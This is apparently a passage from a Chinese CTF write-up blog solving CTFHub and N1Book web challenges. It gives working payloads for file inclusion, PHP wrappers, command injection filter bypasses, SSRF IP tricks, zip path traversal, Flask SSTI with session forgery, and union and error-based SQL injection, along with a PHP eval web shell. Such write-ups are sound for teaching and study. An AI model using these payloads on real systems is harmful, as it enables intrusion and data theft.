(!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {        include $_GET[&quot;file&quot;];    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;</code></pre><p>函数解释：</p><pre><code>#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);</code></pre><p>发现一个shell</p><pre><code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据$_REQUEST 变量既可以收集GET方法发送的数据，也可以接受POST方法接受的数据</code></pre><p>直接蚁剑吧，发现是txt文件，没办法连接</p><p>因为题目给出：</p><p>i have a <a href="shell.txt">shell</a>, how to use it ?</p><p>所以构造参数：</p><p><a href="http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt" target="_blank" rel="noopener">http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt</a></p><p>然后使用hackbar的postdata传参</p><p>ctfhub=system(‘ls’);</p><p>ctfhub=system(‘ls /‘);</p><p>ctfhub=system(‘cat /flag’);</p><p>得到flag</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>题型：php伪协议</p><pre><code>php://input特点如下:1）、Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST2）、PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量$HTTP_RAW_POST_DATA3）、只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。填入的长度，由Coentent-Length指定。4）、只有Content-Type为application/x-www-data-urlencoded时，php://input数据才跟$_POST数据相一致。5）、php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini6）、PHP会将PATH字段的query_path部分，填入全局变量$_GET。通常情况下，GET方法提交的http请求，body为空。总结起来就是，在用$_POST获取不到由APP或者一些接口的回调数据时,就用php://input试试</code></pre><p>题目：</p><pre><code>&lt;?phpif (isset($_GET[&#39;file&#39;])) {    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;i don&#39;t have shell, how to get flag? phpinfo</code></pre><p>这个应该也是get传参，开头的格式也是?file=,也就是说先对你输入的文件的前六个字符进行判断，如果是php://的话就执行一个php文件，如果不是就gg</p><p>搜索了一下发现这是属于php伪协议的一种类型：</p><p>php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>http:/xxx/index.php?file=php://input</code></pre><p>其他伪协议可见链接：</p><p> <a href="https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control" target="_blank" rel="noopener">(很好的一个写给萌新wp的博主，更多伪协议见下方的推荐其他的文章)</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A51747_1.png" alt></p><p>然后则这样就可以了</p><p>补充一个语句：</p><pre><code>&lt;?php system(&quot;find / -name flag*&quot;);?&gt;</code></pre><p>用这个找挺方便的</p><h5 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h5><p>题目：</p><pre><code>&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#39;file&#39;])) {    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);    //highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮，会显示规定要显示的文件}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;i don&#39;t have shell, how to get flag? flag in /flag</code></pre><p>和上一题一样我感觉，但是并不好用</p><pre><code>resource=&lt;要过滤的数据流&gt;            指定了你要筛选过滤的数据流。    必选read=&lt;读链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选write=&lt;写链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选&lt;；两个链的筛选列表&gt;               任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</code></pre><p>这里就不能将指令POST上去了，图中又提示了必须使用<code>php://</code>，FLAG在/flag内，因此想到过滤器filter</p><p>考虑到php伪协议里面的直接读取一个文件里面的内容的一个伪协议↓</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=/flag（有绝对路径的限制下时用）?file=php://filter/resource=/flag</code></pre><p>也可以去掉 <code>read</code>绕过一些限制函数</p><p>success</p><p>考查知识点：php://filter过滤器</p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>题目：</p><pre><code>&lt;?phperror_reporting(0);if (isset($_GET[&#39;file&#39;])) {    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {        include $_GET[&quot;file&quot;];    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;i don&#39;t have shell, how to get flag?phpinfo</code></pre><p>也是：?file=来进行传参</p><p>让我看phpinfo文件，因为根据前面题总结的经验只要这个allow_url_include = On是开的就可以利用php://伪协议，点开phpinfo发现确实是开的，所以抓包试试，success</p><p>此题目和php://input做法一样</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>题目：</p><pre><code>&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $cmd = &quot;ping -c 4 {$_GET[&#39;ip&#39;]}&quot;;    exec($cmd, $res);}?&gt;</code></pre><p>输入框打入：127.0.0.1;ls</p><p>得到</p><pre><code>Array(    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes    [1] =&gt; 24024115330223.php    [2] =&gt; index.php)</code></pre><p>然后输入：127.0.0.1;cat 24024115330223.php</p><p>页面没有显示，但是在源代码里面显示了flag</p><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>题目：</p><pre><code>&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $ip = $_GET[&#39;ip&#39;];    $m = [];    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) {        $cmd = &quot;ping -c 4 {$ip}&quot;;        exec($cmd, $res);    } else {        $res = $m;    }}?&gt;</code></pre><p>和上一题目一样，只不过要防一下过滤</p><p>127.0.0.1;a=ca;b=t;$a$b flag_29869689610883.php</p><p>不错不错新思路</p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>在linux系统下：</p><p>1:&lt;&gt;  2:&lt;  3:${IFS}这三个均可以表示空格</p><p>所以</p><p>127.0.0.1;ls</p><p>127.0.0.1;cat&lt;flag_260652093720389.php</p><p>ybs</p><h4 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符:/\"></a>过滤目录分隔符:/\</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cd flag_is_here;ls</p><p>127.0.0.1;cd flag_is_here;cat flag_25394867112070.php</p><p>也不知道为什么过滤，就好像过滤了一个寂寞</p><h4 id="过滤运算符-amp"><a href="#过滤运算符-amp" class="headerlink" title="过滤运算符:/(||\&amp;)/"></a>过滤运算符:/(||\&amp;)/</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cat flag_13087279769836.php</p><p>这又是一个寂寞</p><h4 id="综合过滤练习：-amp-cat-flag-ctfhub"><a href="#综合过滤练习：-amp-cat-flag-ctfhub" class="headerlink" title="综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/"></a>综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/</h4><p>提示：%0a(换行符) 、%0d(回车符)</p><p>在这里的输入框输入：</p><p>127.0.0.1%0als</p><p>会发现，%0a会被两次编码，所以直接在URL里面输入才算可以</p><p>考虑到在linux系统内shell执行的并不能识别url编码，那么这里得知可以使用hex16位编码来进行转换：</p><p>使用命令$(printf${IFS}”hex编码”)</p><p>127.0.0.1%0als&lt;$(printf${IFS}”\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65”)</p><p>得到文件：</p><p>flag_144233033911102.php</p><p>构造:</p><p>127.0.0.1;cat flag_is_here/flag_144233033911102.php</p><p>127.0.0.1%0aca’’t${IFS}$(printf${IFS}”\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x31\x34\x34\x32\x33\x33\x30\x33\x33\x39\x31\x31\x31\x30\x32\x2E\x70\x68\x70”)</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>题目信息：尝试访问位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><p>GG</p><h4 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h4><p>题目信息：尝试去读取一下Web目录下的flag.php吧</p><p>?url=file:///var/www/html/flag.php</p><p>查看源文件得flag</p><pre><code>URL伪协议：file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样dict://  Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628gopher://  Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了sftp://  Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作ldap://  LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议tftp://  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</code></pre><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>题目提示：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p><p>方法一（bp进行端口爆破）：</p><p>爆破格式为</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52212_2.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52213_3.png" alt></p><p>响应中查看</p><p>方法二：</p><pre><code>import requestsurl=&#39;http://challenge-48d05bc5759898a5.sandbox.ctfhub.com:10080/?url=127.0.0.1:&#39;port=8000while port&lt;=9000:    Wholeurl=url+str(port)    r = requests.get(Wholeurl)    print(Wholeurl)    if(len(r.content)!=0):        print(port)        print(r.content)        break    port=port+1print(&quot;over&quot;)</code></pre><p>py脚本进行爆破</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//QQ%E5%9B%BE%E7%89%8720210114112554.png" alt></p><p>（1/13）</p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>提示：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>描述：请求的URL中必须包含<a href="http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧" target="_blank" rel="noopener">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p><p>?url=<a href="http://notfound.ctfhub.com@127.0.0.1/flag.php" target="_blank" rel="noopener">http://notfound.ctfhub.com@127.0.0.1/flag.php</a></p><h4 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h4><p>描述：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p><p><del>看了大佬的wp</del>：</p><ol><li>8进制格式：0177.00.00.01</li><li>16进制格式：0x7f.0x0.0x0.0x1</li><li>10进制整数格式：2130706433</li><li>在linux下，0代表127.0.0.1，<a href="http://0进行请求127.0.0.1" target="_blank" rel="noopener">http://0进行请求127.0.0.1</a></li></ol><p>?url=0/flag.php</p><h5 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h5><p>描述：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><h6 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h6><p>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p><p><del>搜集wp信息</del>：</p><p>我们这里还是使用DNS重绑定，在网络上存在一个很神奇的服务，<a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如127.0.0.1.xip.io，就会自动重定向到127.0.0.1。<br>即：?url=127.0.0.1.xip.io/flag.php</p><p>但是这个题直接这样也可以</p><p>?url=127.0.0.1/flag.php</p><p>毕竟都是定向到127.0.0.1</p><h1 id="历年真题-WEB-："><a href="#历年真题-WEB-：" class="headerlink" title="历年真题(WEB)："></a>历年真题(WEB)：</h1><h2 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>1.apache文件解析漏洞：影响版本为apache 2.4.0-2.4.29</p><p>2.针对php中第三方解压pclzip的漏洞</p><h3 id="函数理解："><a href="#函数理解：" class="headerlink" title="函数理解："></a>函数理解：</h3><p><a href="https://www.baidu.com/link?url=7LGyFXNc0qzo9rbSaNvdsdwYfAcvtUEjTkpFyAv2jwTT4ZYvmtKP8yV0B01uYftchVyH4BsZthWqYE4aP0JH5VAp5IhYlNR8DQU0or2LZhG&wd=&eqid=bd9a86d40011433c00000003608a9e79" target="_blank" rel="noopener">PHP strrchr() 函数</a>：strrchr(123456789,2)在2处规定的字符，会返回从该位置到字符串结尾的所有字符：23456789，此题中可以利用此函数来得到后缀</p><p>opendir()函数：打开目录句柄，相当于ls命令</p><p>unlink()函数：删除文件，如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">extract()函数</a>：从关联数组中提取变量 <strong><em>（键为变量名，值为变量值）</em></strong>，导入系统，此函数就类似于弄了一个数组，也可以理解为一个表来将目前已经存在的变量，重新覆盖，并且可以利用其中的规则，将重新覆盖的变量标注出来</p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><pre><code>&lt;?phpheader(&quot;Content-Type:text/html; charset=utf-8&quot;);// 每5分钟会清除一次目录下上传的文件require_once(&#39;pclzip.lib.php&#39;);if(!$_FILES){        echo &#39;这里本来是前端页面我直接删了没用&#39;;    show_source(__FILE__);}else{    $file = $_FILES[&#39;file&#39;];    if(!$file){        exit(&quot;请勿上传空文件&quot;);    }    $name = $file[&#39;name&#39;];    $dir = &#39;upload/&#39;;    $ext = strtolower(substr(strrchr($name, &#39;.&#39;), 1));    $path = $dir.$name;    function check_dir($dir){        $handle = opendir($dir);//打开文件路径        while(($f = readdir($handle)) !== false){//$f是否存在于该路径下，存在则继续            if(!in_array($f, array(&#39;.&#39;, &#39;..&#39;))){//$f中是否含有.和..等字符，没有则继续                if(is_dir($dir.$f)){//判断是否为一个目录                    check_dir($dir.$f.&#39;/&#39;);//然后继续重复check_dir的操作                 }else{//如果不是一个目录，那么开始判断是否为正常文件                    $ext = strtolower(substr(strrchr($f, &#39;.&#39;), 1));                    if(!in_array($ext, array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;))){                        unlink($dir.$f);删除这个非法文件                    }                }            }        }    }    if(!is_dir($dir)){        mkdir($dir);    }    $temp_dir = $dir.md5(time(). rand(1000,9999));    if(!is_dir($temp_dir)){        mkdir($temp_dir);    }    if(in_array($ext, array(&#39;zip&#39;, &#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;))){        if($ext == &#39;zip&#39;){            $archive = new PclZip($file[&#39;tmp_name&#39;]);            foreach($archive-&gt;listContent() as $value){                $filename = $value[&quot;filename&quot;];                if(preg_match(&#39;/\.php$/&#39;, $filename)){                     exit(&quot;压缩包内不允许含有php文件!&quot;);                 }            }            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {                   exit(&quot;解压失败&quot;);                   check_dir($dir);            }            check_dir($dir);            exit(&#39;上传成功!&#39;);        }else{            move_uploaded_file($file[&#39;tmp_name&#39;], $temp_dir.&#39;/&#39;.$file[&#39;name&#39;]);            check_dir($dir);            exit(&#39;上传成功!&#39;);        }    }else{        exit(&#39;仅允许上传zip、jpg、gif、png文件!&#39;);    }}</code></pre><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><h4 id="第一步的绕过："><a href="#第一步的绕过：" class="headerlink" title="第一步的绕过："></a>第一步的绕过：</h4><p>利用apache的文件解析漏洞来实现php文件能够执行：</p><p>需要将带有木马的php文件名字改为1.php.111，让111无法被是被然后继续向左来识别php来确定文件类型</p><h4 id="第二步的绕过："><a href="#第二步的绕过：" class="headerlink" title="第二步的绕过："></a>第二步的绕过：</h4><p>在源代码中由定义check_dir函数方法来检查目录的情况，如果不是一个目录的话，会删除这个非法文件，并提示解压失败，所以要构造的特殊压缩包（解压到一半在突出）的方法不可取，所以利用pclzip的已知漏洞：目录穿越问题。如果解压出的文件能都逃掉check_dir这一环节那么解压出的问价就不会被删除。</p><p>源代码可以知道所上传的文件在upload/md5/目录下的，所以要穿越两层：../../</p><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><p>1.生成带有木马的名字为xxxxxxx.php.xxx的文件，然后生成压缩包</p><p>2.010editer打开zip文件：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8830%E6%97%A51922_2.png" alt></p><p>修改这个地方，这里也就体现出了名字为什么一开始设置为7个x了</p><p>然后把这个zip上传，然后访问x.php.xxx就能得到flag</p><h2 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h2><h3 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h3><p>git文件泄露</p><h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>githack工具利用</p><h3 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h3><pre><code>git clone https://github.com/BugScanTeam/GitHackcd GitHackpython GitHack.py http://challenge-df81f549db86830c.sandbox.ctfhub.com:10080/.git</code></pre><p>会得到indedx.html同时flag也被部署到了前端</p><h2 id="常见的收集"><a href="#常见的收集" class="headerlink" title="常见的收集"></a>常见的收集</h2><h3 id="考点：-2"><a href="#考点：-2" class="headerlink" title="考点："></a>考点：</h3><p>敏感文件</p><h3 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h3><p>御剑或者burp配合字典半自动化搜索</p><h3 id="解题：-2"><a href="#解题：-2" class="headerlink" title="解题："></a>解题：</h3><p>实际暴露的敏感信息：</p><p>robots.txt </p><p>index.php~ </p><p>.index.php.swp</p><p>然后拼接这三部分的flag</p><h2 id="afr-1"><a href="#afr-1" class="headerlink" title="afr-1"></a>afr-1</h2><h3 id="考点：-3"><a href="#考点：-3" class="headerlink" title="考点："></a>考点：</h3><p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html" target="_blank" rel="noopener">php中伪协议总结</a>：</p><p>php://filter伪协议的利用</p><p>条件：</p><p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p><h3 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h3><p>直接构造payload</p><h3 id="解题：-3"><a href="#解题：-3" class="headerlink" title="解题："></a>解题：</h3><p>payload：</p><pre><code>?p=php://filter/read=convert.base64-encode/resource=flag</code></pre><p>得：</p><pre><code>&lt;?phpdie(&#39;no no no&#39;);//n1book{afr_1_solved}</code></pre><h2 id="afr-2"><a href="#afr-2" class="headerlink" title="afr-2"></a>afr-2</h2><h3 id="考点：-4"><a href="#考点：-4" class="headerlink" title="考点："></a>考点：</h3><p>目录穿越</p><h3 id="解题：-4"><a href="#解题：-4" class="headerlink" title="解题："></a>解题：</h3><p>打开一看，发现精神小伙，f12发现来自img</p><p><a href="http://challenge-63b251d2430d82a1.sandbox.ctfhub.com:10080/img../" target="_blank" rel="noopener">http://challenge-63b251d2430d82a1.sandbox.ctfhub.com:10080/img../</a></p><p>打开目录下面的flag下载得</p><p>n1book{afr_2_solved}</p><h2 id="afr-3"><a href="#afr-3" class="headerlink" title="afr-3"></a>afr-3</h2><h3 id="考点：-5"><a href="#考点：-5" class="headerlink" title="考点："></a>考点：</h3><p>1.目录穿越</p><p>2.对linux/proc目录的较为深层次的理解：</p><p> /proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。</p><p>对应目录下的cmdline可读出比较敏感的信息，</p><p>Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。<br>/proc/[pid],当查看当前进程的时候可以用/proc/self代替<br>cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息<br>cwd — 指向当前进程运行目录的一个符号链接<br>environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示</p><pre><code>/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用/proc/mounts # 挂载的文件系统列表/proc/net/arp # arp表，可以获得内网其他机器的地址/proc/net/route # 路由表信息/proc/net/tcp and /proc/net/udp # 活动连接的信息/proc/net/fib_trie # 路由缓存/proc/version  # 内核版本/proc/[PID]/cmdline # 可能包含有用的路径信息/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell/proc/[PID]/cwd     # 当前进程的工作目录/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</code></pre><p>3.flasksession伪造</p><h3 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h3><p>利用目录穿越实现读取/proc/self/cmdline，读取flag.py，读取key.py</p><p>利用脚本配合key伪造session</p><h3 id="解题：-5"><a href="#解题：-5" class="headerlink" title="解题："></a>解题：</h3><p>1.</p><pre><code>?name=../../../../proc/self/cmdline</code></pre><p>得pythonserver.py</p><p>2.</p><pre><code>?name=../../../../proc/self/cwd/server.py</code></pre><p>得</p><pre><code>#!/usr/bin/pythonimport osfrom flask import (Flask, render_template, request, url_for, redirect, session, render_template_string)from flask_session import Sessionapp = Flask(__name__)execfile(&#39;flag.py&#39;)execfile(&#39;key.py&#39;)FLAG = flagapp.secret_key = key @app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def n1page():    if request.method != &quot;POST&quot;:        return redirect(url_for(&quot;index&quot;))    n1code = request.form.get(&quot;n1code&quot;) or None    if n1code is not None:         n1code = n1code.replace(&quot;.&quot;, &quot;&quot;).replace(&quot;_&quot;, &quot;&quot;).replace(&quot;{&quot;, &quot;&quot;).replace(&quot;}&quot;, &quot;&quot;)    if &quot;n1code&quot; not in session or session[&#39;n1code&#39;] is None: session[&#39;n1code&#39;] = n1code    template = None    if session[&#39;n1code&#39;] is not None:         template =         &#39;&#39;&#39;        &lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#39;t look at our &lt;a href=&#39;/article?name=article&#39;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt;         &#39;&#39;&#39; %        session[&#39;n1code&#39;]        session[&#39;n1code&#39;] = None        return render_template_string(template) @app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():     return render_template(&quot;main.html&quot;) @app.route(&#39;/article&#39;, methods=[&#39;GET&#39;])def article():     error = 0if &#39;name&#39; in request.args:    page = request.args.get(&#39;name&#39;) else:    page = &#39;article&#39;if page.find(&#39;flag&#39;) &gt;= 0: page = &#39;notallowed.txt&#39;try:    template = open(&#39;/home/nu11111111l/articles/{}&#39;.format(page)).read() except Exception as e:    template = e    return render_template(&#39;article.html&#39;, template=template)if __name__ == &quot;__main__&quot;:     app.run(host=&#39;0.0.0.0&#39;, debug=False)</code></pre><p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p><p>目前的session经过解密是：{‘n1code’: None}</p><p>针对源代码进行注入：</p><pre><code>{&#39;n1code&#39;: &#39;{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}&#39;}</code></pre><p>这个地方为什么注入这样的语句我没弄明白</p><p>3.利用脚本配合key.py构造session</p><p>获取key.py</p><pre><code>?name=../../../../proc/self/cwd/key.py</code></pre><p>key = ‘Drmhze6EPcv0fN_81Bj-nA’</p><pre><code> python hctf_admin_2.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;{&#39;n1code&#39;: &#39;{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}&#39;}&quot;得到：.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YIwlRQ.1bHGytWxAX498Sfx6r9JQtrwrSU</code></pre><p>将其保存到cookie中的session中即可，注意前面的点</p><h2 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入-1"></a>SQL注入-1</h2><pre><code>&amp;tips=1</code></pre><p>得到提示：select * from notes where id =’3’</p><p>payload：</p><pre><code>1&#39; order by 4 --+1&#39; order by 3 --+-1&#39; union select 1,2,3 --+-1&#39; union select 1,database(),3 --+-1&#39; union select 1,concat(table_name),3 from information_schema.tables where table_schema=&#39;note&#39; --+-1&#39; union select 1,concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39; --+-1&#39; union select 1,concat(fllllag),3 from note.fl4g --+</code></pre><p>得到flag：<strong>n1book{union_select_is_so_cool}</strong></p><h2 id="SQL注入-2"><a href="#SQL注入-2" class="headerlink" title="SQL注入-2"></a>SQL注入-2</h2><h3 id="考点：-6"><a href="#考点：-6" class="headerlink" title="考点："></a>考点：</h3><p>报错注入</p><h3 id="解题：-6"><a href="#解题：-6" class="headerlink" title="解题："></a>解题：</h3><h4 id="基于报错："><a href="#基于报错：" class="headerlink" title="基于报错："></a>基于报错：</h4><pre><code>name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(table_name) from information_schema.tables where table_schema=&#39;note&#39;),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(flag) from 